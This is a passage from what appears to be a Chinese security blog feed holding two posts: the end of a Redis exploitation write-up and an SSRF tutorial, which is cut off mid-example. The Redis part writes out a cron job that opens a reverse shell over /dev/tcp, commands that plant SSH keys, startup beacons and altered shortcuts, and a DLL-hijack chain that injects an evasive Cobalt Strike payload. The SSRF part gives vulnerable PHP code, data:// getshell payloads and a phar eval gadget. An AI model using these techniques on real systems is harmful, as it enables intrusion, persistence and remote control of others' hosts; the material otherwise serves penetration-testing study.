--lport 16379 --rpath "/root/.ssh" --rfile authorized_keys --lfile ./SSH/authorized_keys</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/85962012cf8bcebde873f98e9707d9eb.png"></p><h4 id="Linux写计划任务-1"><a href="#Linux写计划任务-1" class="headerlink" title="Linux写计划任务"></a>Linux写计划任务</h4><p>在Windows下编写Linux的计划任务文件注意<code>\r\n</code>换行要变成<code>\n\n</code>,Ubuntu计划任务文件尾行需要换行：</p><pre><code class="python">SHELL=/bin/bashPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.11.1/6667 0&gt;&amp;1</code></pre><p>脚本执行命令：</p><pre><code class="python">python3 RedisWriteFile.py --rhost 192.168.11.133 --rport 6379 --lhost 192.168.11.1 --lport 16379 --rpath "/etc/cron.d" --rfile shell --lfile ./cron/cron.d</code></pre><p>反弹成功：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/556c48f2fd6871459c7122db487e6afe.png"></p><h4 id="Windows写启动项-1"><a href="#Windows写启动项-1" class="headerlink" title="Windows写启动项"></a>Windows写启动项</h4><pre><code class="python">python3 RedisWriteFile.py --rhost 192.168.200.97 --rport 6379 --lhost 192.168.200.138 --lport 16379 --rpath "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp" --rfile beacon.exe --lfile beacon.exe</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/575cd5cb885b8c831ad1805f222eeac9.png"></p><h4 id="Windows文件覆盖-新增"><a href="#Windows文件覆盖-新增" class="headerlink" title="Windows文件覆盖/新增"></a>Windows文件覆盖/新增</h4><p>现在可以对一些常用位置的文件进行覆盖了，如桌面快捷方式、快速启动栏、软件程序、动态链接库等。这些操作基本上都是需要管理员权限的。</p><h5 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h5><p>先使用文件探测方式探测是否存在常见的快捷方式并确认好启动文件位置，一般在公用桌面存在一些：</p><pre><code class="python">EVAL "return dofile('C:/Users/Public/Desktop/Google Chrome.lnk')" 0EVAL "return dofile('C:/Users/Public/Desktop/Notepad++.lnk')" 0</code></pre><p>在本地建立快捷方式 ，根据在目标主机上获取的文件位置信息可以在快捷方式的目标中写入命令<code>C:\Windows\System32\cmd.exe /c calc &amp;  "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"</code> ，将运行方式设置为最小化：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/6e1b28cea83b9a7b8e6d7da489374659.png"><br>执行脚本同步：</p><pre><code class="python">python3 RedisWriteFile.py --rhost 192.168.200.97 --rport 6379 --lhost 192.168.200.138 --lport 16379 --rpath "C:/Users/Public/Desktop" --rfile "Google Chrome.lnk" --lfile "Google Chrome.lnk"</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/093ab56ed159388b827b9b47d7f641b7.gif"></p><h5 id="快速启动栏"><a href="#快速启动栏" class="headerlink" title="快速启动栏"></a>快速启动栏</h5><p>在文件夹<code>%AppData%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar</code>中，可以修改，但是测试新增文件并不会在任务栏显示。<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/af92092b9edcc756437a953dc0962cdc.png"></p><h5 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h5><p>开启Process Monitor监控，然后启动Redis，观察到Redis在其安装目录加载了<code>dbghelp.dll</code>和<code>CRYPTBASE.DLL</code>两个DLL,这两个DLL本来是在系统目录中的，加载过程中存在了DLL加载顺序的劫持（DLL劫持相关基础可以查看<a href="https://yanghaoi.github.io/2021/11/18/dll-jie-chi/">DLL劫持漏洞</a>）：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/c698ca3d8fc6bf984232694d40a3e131.png"><br>查看进程的架构为x64，作为漏洞利用的DLL也需要是相同架构：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2cb69eba140ae0b8ab41cb68f923aad4.png"></p><p>生成完成后可以使用<code>dumpbin /headers xxx.dll</code>命令确认，或者在010 Editor下打开后查看PE后面的16进制，x64为8664，x86为014C(用记事本打开二进制文件查看字符串64位是<code>PE  d†</code>，32 位是<code>PE L</code>)，还可以使用exeinfope工具(吾爱破解工具包):<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9956b741c13fd911842ef7a119dad9c8.png"></p><p>参考 <a href="https://xz.aliyun.com/t/8153?page=3">Redis on Windows 出网利用探索</a> 一文中，DLL劫持可以由 <code>BGSAVE</code>等命令主动触发，命令触发后会创建线程来执行保存数据。生成<code>dbghelp.dll</code>的劫持用到的是 <a href="https://github.com/slaeryan/AQUARMOURY/tree/master/Brownie">Brownie</a>项目进行DLL的免杀，<a href="https://github.com/monoxgas/Koppeling">Koppeling</a> 项目进行DLL函数代理转发构建：<br>1.生成Cobalt Strike的x64的DLL：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8b422092ae816be1b087546e7cab5b0b.png"><br>2.使用Brownie项目中的AES.py脚本加密Bin输出logo.png：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/5a54ed94e9bbf0458596813450794f48.png"><br>3.在Brownie中配置与加密脚本中一致的AES-KEY。<br>4.DLL中使用<code>CreateProcess</code>和<code>CreateRemoteThread</code>API组合创建进程注入shellcode（如果将shellcoode注入到Redis自身中，<code>basave</code>是无法返回beacon的。因为是异步执行产生子进程进行数据保存，保存完成后进程退出，创建的线程没有存活时间，所以这一步会看到WinExec可以正常执行，beacon无法返回，查看日志也可以看到<code>Background saving started by pid 2008</code>记录。另外注入自身内存(Redis启动时加载dbghelp.dll)，beacon的退出会导致Redis异常退出。）:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/84a5e8c8215a8c38f5104335ef0cd689.png"><br>5.生成项目DLL后使用Koppeling项目中的Python脚本来链接到转发DLL:</p><pre><code class="python">python3 PyClone.py AES.dll C:\windows\system32\dbghelp.dll -o dbghelp.dll</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/e4db3f27a21559bd617154e98f92969c.png"><br>6.使用Redis主从同步脚本写入后执行<code>bgsave</code>触发DLL劫持：</p><pre><code class="python">python3 RedisWriteFile.py --rhost 192.168.200.97 --rport 6379 --lhost 192.168.200.138 --lport 16379 --rpath "D:/phpstudy_pro/Extensions/redis3.0.504" --rfile "dbghelp.dll" --lfile "dbghelp.dll"</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/188376a7149dc5dbc46e0a67415437cc.gif"></p><p>注：在第四步中，</p><h3 id="Redis模块"><a href="#Redis模块" class="headerlink" title="Redis模块"></a>Redis模块</h3><p>在Redis4.0或更高版本中，支持了自定义<a href="https://redis.io/modules">模块</a>，可以编写模块来执行命令，参考GitHub项目<a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">RedisModules-ExecuteCommand</a>。利用主从复制写入文件后使用<code>module load xx.so</code>加载，通过模块扩展进行命令执行等操作，类似MySQL的UDF。操作命令如下:</p><pre><code class="python">config set dir /tmpconfig set dbfilename system.soslaveof 192.168.11.1 16379  module load /tmp/exp.soslaveof no one system.exec 'id'#module  list #列出加载的模块#module unload xxx #根据list列出的名称卸载模块</code></pre><p>用RedisWriteFile脚本增加自动命令执行：</p><pre><code class="python">python3 RedisWriteFile.py --rhost 192.168.11.133 --rport 6379 --lhost 192.168.11.1 --lport 16379 --rpath "/tmp" --rfile system.so --lfile system.so</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/80a9d6fc69b3481dcf76d78ab3e90615.png"></p><p>Windows版本用于执行命令的模块：<a href="https://github.com/0671/RedisModules-ExecuteCommand-for-Windows">RedisModules-ExecuteCommand-for-Windows</a> ：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/60da50d286254d094d975df3f6eceaa3.png"><br>同时这位师傅已经开发出了完整的利用工具：<a href="https://github.com/0671/RabR">RabR</a></p><h2 id="0x04-文末总结"><a href="#0x04-文末总结" class="headerlink" title="0x04 文末总结"></a>0x04 文末总结</h2><p>通过整理Redis漏洞相关资料后总结：Redis在&lt;3.2.0版本上默认配置上存在未授权漏洞，后续版本如果配置错误也会存在问题。针对未授权主要利用rdb数据库文件写入、主从复制写入和模块加载来利用，同时发现结合AOF配置可以进行自动写shell的方法。针对windows上dll劫持的利用也进行了深入分析，达到比较完美的利用。更是发现了GitHub上几位师傅开发的工具，利用起来非常方便。最后在使用脚本之前一定要注意数据的备份方便后续恢复。</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a><br><a href="https://github.com/0671/RabR">https://github.com/0671/RabR</a><br><a href="https://www.secpulse.com/archives/5366.html">https://www.secpulse.com/archives/5366.html</a><br><a href="https://blog.xray.cool/post/learning-redis-security/">https://blog.xray.cool/post/learning-redis-security/</a><br><a href="https://jkme.github.io/redis-on-windows-dll-hijack.html">https://jkme.github.io/redis-on-windows-dll-hijack.html</a><br><a href="https://yanghaoi.github.io/2021/10/07/ssrf-lou-dong-ji-chu/">https://yanghaoi.github.io/2021/10/07/ssrf-lou-dong-ji-chu/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis漏洞利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞基础</title>
      <link href="/2021/10/07/ssrf-lou-dong-ji-chu/"/>
      <url>/2021/10/07/ssrf-lou-dong-ji-chu/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>SSRF(Server-side request forgery，服务端跨站请求伪造)是一种 Web 安全漏洞，允许攻击者诱导服务器端应用程序向攻击者选择的任意域发出 HTTP 请求。攻击可强制让服务器链接到任意内部或者外部的其他主机，从而可能泄露服务器敏感信息或者对其他主机发起恶意请求。常见的利用方式可以探测内部网络部署的服务信息、端口开放情况，攻击一些内部的服务等。本文对SSRF的类型、协议支持、可能的产生的漏洞代码、相关利用工具进行分析整理，完善SSRF漏洞的理解和利用。</p><h2 id="0x02-SSRF的类型"><a href="#0x02-SSRF的类型" class="headerlink" title="0x02 SSRF的类型"></a>0x02 SSRF的类型</h2><p>根据SSRF请求后的返回情况来看，利用SSRF可以分为三种情况：<br>1.回显SSRF<br>2.侧信息SSRF(时间延时、返回状态码等)<br>3.盲SSRF(完全没有回显或其他侧信息)</p><p>一般来说，完全回显的SSRF可以直观的看到SSRF产生的效果，比如很快得知内部的一些系统框架版本等信息；部分回显可能只有一些响应状态码等侧信息来判断内部网络情况；盲SSRF这种由于返回数据包中看不出来效果就只有尝试数据带外等利用方式了。</p><h3 id="回显SSRF"><a href="#回显SSRF" class="headerlink" title="回显SSRF"></a>回显SSRF</h3><p>有回显的SSRF是说在漏洞触发后，可以将服务器请求后的详细源码信息内容返回。以Webgoat靶场中的SSRF模块来分析，在IDEA中查看JAVA代码，其使用了<code>java.net.URL</code>类对外部发起请求，其关键源码和请求数据包如下：</p><pre><code class="java">import java.net.URL;try (InputStream in = new URL(url).openStream()) {     // Otherwise the \n gets escaped in the response     html = new String(in.readAllBytes(), StandardCharsets.UTF_8).replaceAll("\n","&lt;br&gt;");       } catch (MalformedURLException e) {                return getFailedResult(e.getMessage());    } catch (IOException e) {     //in case the external site is down, the test and lesson should still be ok     html = "&lt;html&gt;&lt;body&gt;Although the http://ifconfig.pro site is down, you still managed to solve" + " this exercise the right way!&lt;/body&gt;&lt;/html&gt;";            }</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/a6ed362e91cf27c7d26794eff3b3b5f9.png"><br>代码中对输入的URL进行限定，只允许其为<code>http://ifconfig.pro</code>，这里为了显示其他效果，将代码中的字符串匹配逻辑修改可以任意URL请求，将<code>matches</code>匹配空字符串并对判断取反：</p><pre><code class="java"> if (!url.matches(" ")) {            String html;            try (InputStream in = new URL(url).openStream()) {                ...            } catch {             ....            }</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/c31883f7c5cd86caeac98a046f8fba9c.png"><br>这样一来就可以使用其他URL测试效果了，在靶场中找到触发位置拦截数据包，将URL修改成<code>http://www.baidu.com</code>,响应中看到获取了baidu.com的网页源码：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/859117ad8f942e9c9614755b8d9d282a.png"><br>所以这里就是一个完全回显的SSRF漏洞，提交的URL参数在服务器上使用<code>java.net.URL</code>类去发起请求，然后打开URL保存二进制流<code>InputStream in = new URL(url).openStream()</code>，最后将结果处理后返回给前端。所以在这个漏洞点关注的就是<code>java.net.URL</code>类使用时是否对请求的地址进行了限制。</p><h3 id="侧信息SSRF"><a href="#侧信息SSRF" class="headerlink" title="侧信息SSRF"></a>侧信息SSRF</h3><p>这种类型因为在后端进行了相应处理，无法获得完整的响应源码，只能通过后端返回状态码，请求响应延时等来判断利用结果。像上面的Demo可以修改一下模拟这个场景，成功请求返回1,失败返回0：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/42a8696419d732b3b0ad462bf4fc39e0.png"><br>请求不存在的域名导致失败，输出位置返回0：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/abf886d74a0893cdd0e2a8109859b9de.png"></p><h3 id="盲SSRF"><a href="#盲SSRF" class="headerlink" title="盲SSRF"></a>盲SSRF</h3><p>这一类就完全没有回显和侧信息来泄露SSRF利用结果，一般的可以通过带外来观察是否存在漏洞，如下使用端口监听方法，VPS上开启端口监听，在可能存在漏洞的位置写入VPS的监听地址:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/13e263257c37f10c3bff1c1de2c5d71a.png"></p><p>这样就在vps上观察到了来自服务器的请求。也可以使用<a href="http://www.dnslog.cn/">DNSLOG</a>判断：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/d5613fa8b577a0f3f381a5587aca2a26.png"></p><h2 id="0x03-SSRF漏洞挖掘与代码审计"><a href="#0x03-SSRF漏洞挖掘与代码审计" class="headerlink" title="0x03 SSRF漏洞挖掘与代码审计"></a>0x03 SSRF漏洞挖掘与代码审计</h2><h3 id="常见漏洞场景"><a href="#常见漏洞场景" class="headerlink" title="常见漏洞场景"></a>常见漏洞场景</h3><p>SSRF漏洞产生的原因是在一些需要服务器发起请求来获取数据的情况下，代码层面没有做好限制，导致传入的地址用户可控，那么就会产生漏洞。黑盒挖掘的情况下，可以留意下列可能的场景：</p><ul><li>带有URL的参数传递</li><li>参数中的图片地址</li><li>端口开放情况检测</li><li>数据库链接检测</li><li>代码仓库的clone</li><li>远程文件内容获取</li><li>远程图片获取</li><li>后台状态刷新</li><li>web hook消息同步</li><li>…</li></ul><p>关注一些可能使用远程地址的功能、带有URL等关键字的参数、带远程地址的参数值等。如在gitlab中有一个从URL导入仓库的功能：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/0ec1e56a23d6a2fb3e5ce9e29b0416db.png"><br>抓包修改参数中的import_url即可发起对其他服务器的访问(这里使用了IPV6地址绕过限制进行服务器本地SSRF)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/83b72ca9a2d7ec60bd35d3af430e079d.png"><br>另外一个案例是在获取远程图片功能中，本来是只允许特定域名，但是这里未进行限制，修改地址为DNSLOG后成功收到请求：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/4d1b17f0c2abdcd20aae6786539b22a5.png"></p><h3 id="JAVA中的SSRF"><a href="#JAVA中的SSRF" class="headerlink" title="JAVA中的SSRF"></a>JAVA中的SSRF</h3><p> 产生上述问题的原因都是在代码层面没有对传入的地址进行严格限制。在JAVA代码审计中，不仅要关注可能对外发起请求的类调用，也要关注一些限制措施是否存在绕过的可能，在手工审计过程中通过功能点审计一些常见的外部请求类和第三方包的使用代码，进而分析是否存在漏洞：</p><p><em>java.net.URL</em><br>如下webgoat靶场SSRF中的代码，使用URL类中<code>openStream()</code>打开远程链接的数据流：</p><pre><code class="java">import java.net.URL;try { InputStream in = new URL(url).openStream()} </code></pre><p><em>java.net.URLConnection</em><br>URL类的openConnection方法：</p><pre><code class="JAVA">import java.net.URLConnection;...URLConnection urlConnection = new URL(url).openConnection();   ...</code></pre><p><em>java.net.HttpURLConnection</em></p><pre><code class="JAVA">import java.net.HttpURLConnection;URL requrl = new URL(url);HttpURLConnection con = (HttpURLConnection) requrl.openConnection();</code></pre><p>  <em>java.net.http</em><br>在JDK11后开始自带，由JDK9的<code>jdk.incubator.http</code>迁移而来：</p><pre><code class="java">import java.net.http.HttpClient;import java.net.http.HttpRequest;import java.net.http.HttpResponse; HttpClient client = HttpClient.newHttpClient();                HttpRequest request = HttpRequest.newBuilder()                        .uri(                                java.net.URI.create("http://foo.com/"))                        .build();                client.sendAsync(request, HttpResponse.BodyHandlers.ofString())                        .thenApply(HttpResponse::body)                        .thenAccept(System.out::println)                        .join();</code></pre><p><em>Apache HttpComponents</em></p><pre><code class="java">try (CloseableHttpClient httpclient = HttpClients.createDefault()) {...}httpclient.execute()HttpPost httpPost = new HttpPost...</code></pre><p><em>okhttp</em><br><a href="https://square.github.io/okhttp/">OkHttp</a>是一个 Java 的 HTTP+SPDY 客户端开发包，同时也支持 Android，由Square 公司开源贡献。示例代码：</p><pre><code class="java">package okhttp3.guide;import java.io.IOException;import okhttp3.OkHttpClient;import okhttp3.Request;import okhttp3.Response;public class GetExample {  final OkHttpClient client = new OkHttpClient();  String run(String url) throws IOException {    Request request = new Request.Builder()        .url(url)        .build();    try (Response response = client.newCall(request).execute()) {      return response.body().string();    }  }  public static void main(String[] args) throws IOException {    GetExample example = new GetExample();    String response = example.run("https://raw.github.com/square/okhttp/master/README.md");    System.out.println(response);  }}</code></pre><p><em>Retrofit</em><br>Retrofit 是 Square 公司出品的默认基于 OkHttp 封装的一套 RESTful 网络请求框架，适用于 Android 和 Java 的类型安全HTTP 客户端，示例代码：</p><pre><code class="java">Retrofit retrofit = new Retrofit.Builder()    .baseUrl("https://api.github.com/")    .addConverterFactory(GsonConverterFactory.create())    .build();GitHubService service = retrofit.create(GitHubService.class);</code></pre><p><em>RestTemplate</em><br><a href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/client/RestTemplate.html">RestTemplate</a>是Spring用于同步客户端HTTP访问的中心类，遵循RESTful规范，简化了与 HTTP 服务器的通信。</p><pre><code class="java">RestTemplate restTemplate = new RestTemplate();        ResponseBean responseBean = restTemplate.postForObject(url, requestBean, ResponseBean.class);</code></pre><p><em>OpenFeign</em><br><a href="https://github.com/OpenFeign/feign">OpenFeign</a>是一个声明式WebService客户端，其工作原理是将注释处理成模板化的请求，通过占位符{id}来简化API的处理,示例代码：</p><pre><code class="java">interface Bank {  @RequestLine("POST /account/{id}")  Account getAccountInfo(@Param("id") String id);}public class BankService {  public static void main(String[] args) {    Bank bank = Feign.builder()        .decoder(new AccountDecoder())        .options(new Request.Options(10, TimeUnit.SECONDS, 60, TimeUnit.SECONDS, true))        .target(Bank.class, "https://api.examplebank.com");  }}</code></pre><h3 id="PHP中的SSRF"><a href="#PHP中的SSRF" class="headerlink" title="PHP中的SSRF"></a>PHP中的SSRF</h3><p>在PHP中如<code>fsockopen()、pfsockopen()、file_get_contents()、show_source()、highlight_file()、curl_exec()、curl_multi_exec()、fopen()、readfile()、mysqli_connect()、include()、require()、file()、copy()</code>等函数使用过程中没有很好的对参数进行限制就可能导致SSRF漏洞。可以在php.net中搜索网络请求、套接字建立、数据库链接、文件操作相关的函数，部分函数使用的示例代码如下，代码审计时可根据关键字搜索函数进行分析：</p><pre><code class="php">&lt;?phpclass SSRF {    public $url;    public $port;    function __construct() {        $this-&gt;url = $_GET['url'];        $this-&gt;port = $_GET['port'];    }    function SSRF_fsockopen() {         echo "&lt;hr&gt;".__FUNCTION__."&lt;br&gt;";        $fp = fsockopen($this-&gt;url, $this-&gt;port, $errno, $errstr, 30);    }    function SSRF_pfsockopen() {         echo "&lt;hr&gt;".__FUNCTION__ ;        $fp = pfsockopen($this-&gt;url, $this-&gt;port, $errno, $errstr, 5);    }    function SSRF_file_get_contents(){        echo "&lt;hr&gt;".__FUNCTION__."&lt;br&gt;";        file_get_contents($this-&gt;url);    }    function SSRF_curl_exec(){        echo "&lt;hr&gt;".__FUNCTION__."&lt;br&gt;";        $ch = curl_init();        // 设置 URL 和相应的选项        curl_setopt($ch, CURLOPT_URL, $this-&gt;url);        curl_setopt($ch, CURLOPT_HEADER, 0);        // 抓取 URL 并把它传递给浏览器        curl_exec($ch);        // 关闭 cURL 资源，并且释放系统资源        curl_close($ch);    }    function SSRF_curl_multi_exec(){        echo "&lt;hr&gt;".__FUNCTION__."&lt;br&gt;";        // 创建cURL资源        $ch1 = curl_init();        // 设置URL和相应的选项        curl_setopt($ch1, CURLOPT_URL, $this-&gt;url);        curl_setopt($ch1, CURLOPT_HEADER, 0);        // 创建批处理cURL句柄        $mh = curl_multi_init();        // 增加2个句柄        curl_multi_add_handle($mh,$ch1);        $active = null;        // 执行批处理句柄        do {            $mrc = curl_multi_exec($mh, $active);        } while ($mrc == CURLM_CALL_MULTI_PERFORM);        while ($active &amp;&amp; $mrc == CURLM_OK) {            if (curl_multi_select($mh) != -1) {                do {                    $mrc = curl_multi_exec($mh, $active);                } while ($mrc == CURLM_CALL_MULTI_PERFORM);            }        }        // 关闭全部句柄        curl_multi_remove_handle($mh, $ch1);        curl_multi_close($mh);    }    function SSRF_fopen(){        echo "&lt;hr&gt;".__FUNCTION__."&lt;br&gt;";        fopen($this-&gt;url,"r");        }    function SSRF_readfile(){        echo "&lt;hr&gt;".__FUNCTION__."&lt;br&gt;";        readfile($this-&gt;url);    }    function SSRF_mysqli_connect(){        echo "&lt;hr&gt;".__FUNCTION__."&lt;br&gt;";        mysqli_connect($this-&gt;url, "my_user", "my_password", "my_db");    }    function SSRF_include(){        echo "&lt;hr&gt;".__FUNCTION__."&lt;br&gt;";        include "$this-&gt;url";    }    function SSRF_require(){        echo "&lt;hr&gt;".__FUNCTION__."&lt;br&gt;";        require "$this-&gt;url";    }}$S = new SSRF;$S-&gt;SSRF_fsockopen();   //url=127.0.0.1&amp;port=9666$S-&gt;SSRF_pfsockopen();  //连接一直不会关闭, url=tcp://127.0.0.1&amp;port=9666 ,可用 ssl://,tls:// $S-&gt;SSRF_file_get_contents();// url=http://127.0.0.1:9666/1.php$S-&gt;SSRF_curl_exec();       //url=http://127.0.0.1:9666/1.php$S-&gt;SSRF_curl_multi_exec(); // url=http://127.0.0.1:9666/1.php$S-&gt;SSRF_fopen();           //配置php.ini allow_url_fopen=On,url=http://127.0.0.1:9666/1.php$S-&gt;SSRF_readfile();       // url=http://127.0.0.1:9666/1.php$S-&gt;SSRF_mysqli_connect(); //url=127.0.0.1:9666$S-&gt;SSRF_include();        //配置php.ini allow_url_include=On,需要文件名为.php,url=http://127.0.0.1:9666/1.php$S-&gt;SSRF_require();        //配置php.ini allow_url_include=On,需要文件名为.php,url=http://127.0.0.1:9666/1.php?&gt;</code></pre><h2 id="0x04-SSRF可利用的协议"><a href="#0x04-SSRF可利用的协议" class="headerlink" title="0x04 SSRF可利用的协议"></a>0x04 SSRF可利用的协议</h2><h3 id="JAVA-SSRF可利用的协议"><a href="#JAVA-SSRF可利用的协议" class="headerlink" title="JAVA-SSRF可利用的协议"></a>JAVA-SSRF可利用的协议</h3><p>在JAVA中漏洞触发点支持的协议跟JDK版本和代码配置有关，有些类方法只能使用部分协议。更多详细信息参考<a href="https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf">OWASP资料</a>。</p><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/653360e24d3790514a6876eff77a949e.png"></p><p>经过测试在openjdk-JDK15中可以支持以下协议使用：<code>http、https、ftp、file、jar、mailto*</code>,openjdk9中移除了协议netdoc(<a href="https://bugs.openjdk.java.net/browse/JDK-8176351">issues</a>),JDK8中移除了gopher协议的支持。以webgoat靶场SSRF为例测试部分协议的使用，使用file协议读取文件/列目录(<code>file:///C:\\2.txt</code>)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/a55c4f5a2b0287f4ab2af71cd1c542d9.png"><br>jar协议读取本地文件(<code>jar:file:///D:\OneForAll.zip!/OneForAll/requirements.txt</code>):<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/72e9f8ce10bc11dd918f3339dbb5786c.png"><br>jar协议读取远程文件(<code>jar:https://x.x.x/xx.zip!/file.txt</code>)，同时会下载远程文件保存在本地缓存中：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/f4df4352acd32d913757c7503cdedcb4.png"></p><p><em>java.net.HttpURLConnection类转换</em><br>之前说到部分类支持的协议会进行限制，使用了HttpURLConnection对openConnection进行类型强制转换后的请求就只支持HTTP(S)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/92bafb6cbdd6274599adbfdded4c94ef.png"></p><p><em>mailto</em><br>mailto协议可以用来发送邮件，该协议的利用需要后端配置了邮件的发送服务器和相关的支持才能正常使用，协议格式如下：</p><pre><code class="html">mailto:name1@rapidtables.com?cc=name2@rapidtables.com&amp;bcc=name3@rapidtables.com&amp;subject=The%20subject%20of%20the%20email&amp;body=The%20body%20of%20the%20email//抄送：name2@rapidtables.com//密送：name3@rapidtables.com//主题：The%20subject%20of%20the%20email//正文：The%20body%20of%20the%20email</code></pre><h3 id="PHP-SSRF可利用的协议"><a href="#PHP-SSRF可利用的协议" class="headerlink" title="PHP-SSRF可利用的协议"></a>PHP-SSRF可利用的协议</h3><p>在PHP中支持的协议：</p><pre><code class="html">dict:// — 词典网络协议(curl扩展支持)file:// — 访问本地文件系统http:// — 访问 HTTP(s) URLftp:// — 访问 FTP(s) URLphp:// — 访问各种 I/O 流zlib:// ——压缩流data:// — 数据 (RFC 2397)glob:// — 查找匹配模式的路径名phar:// — PHP 存档ssh2:// — 安全外壳 2rar:// — RARogg:// — 音频流expect:// —— 流程交互流gopher:// ——   https://zhuanlan.zhihu.com/p/112055947</code></pre><p><em>DATA协议</em><br>data协议配合include(require) Getshell</p><pre><code class="php">data://text/plain,&lt;?php%20phpinfo();data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b  (&lt;?php phpinfo();?&gt;,+号使用url编码)data://image/jpeg,</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/49e2d53bc82df88fbccbc2fcf9a3b913.png"></p><p><em>DICT协议</em><br>DICT协议是词典网络协议，在<a href="http://www.dict.org/rfc2229.txt">RFC 2009</a>中进行描述，使用空格或者<code>:</code>作为分隔参数。在利用dict协议中，一行只能包括一行命令，不能输入多行命令(所以不能攻击认证的redis)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/0efaa0296941bab70e196afd822e1156.png"><br>对于<code>&lt;、?、:</code> 等特殊符号需要转为对应的16进制：</p><pre><code class="llvm">&lt;  = \x3c? =&gt; \x3f: =&gt; \x3a</code></pre><p><em>Gopher</em><br>该协议在PHP中需要cURL扩展支持，使用<code>curl_exec()</code>,<code>curl_multi_exec()</code>函数发起请求。gopher协议格式为<code>gopher://IP:port/_{TCP/IP数据流}</code>，开始的<code>_</code>字符可以随意，数据流使用URL编码，在BurpSuite中利用SSRF-Gopher发起GET/POST请求：<br>1.复制请求体<br>2.使用Burp-Decoder模块URL编码<br>3.替换<code>%0a</code>/ <code>%0d%0a</code>为 <code>%250d%250a</code>或<code>%25%30%64%25%30%61</code>(换行符 <code>%0d%0a</code>的URL编码)</p><p>GET只需要链接地址即可：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/82af4021ee8fc5ac5f7af0ea100241dc.png"></p><p>POST需要包含关键请求头和POST数据：Content-Type,Content-Length,HOST,POST_DATA，将整个请求URL编码即可：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/4ab536ffff2d6fdcb2d1198bf21abd04.png"><br>需要对换行符编码替换，完成后使用Gopher发送：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/cab2d0a5b91e61d9037a6866b3262cf3.png"></p><p><em>PHAR</em><br>PHAR协议用于在PHP中解析phar文件，phar文件的meta-data字段存在反序列化漏洞，可以使用协议读取文件触发反序列化，漏洞代码：</p><pre><code class="php">&lt;?phpclass AnyClass{    function __destruct()    {        var_dump($_this);        eval($this -&gt; output);    }}file_get_contents($_GET["file"]);</code></pre><p>phar文件POC:</p><pre><code 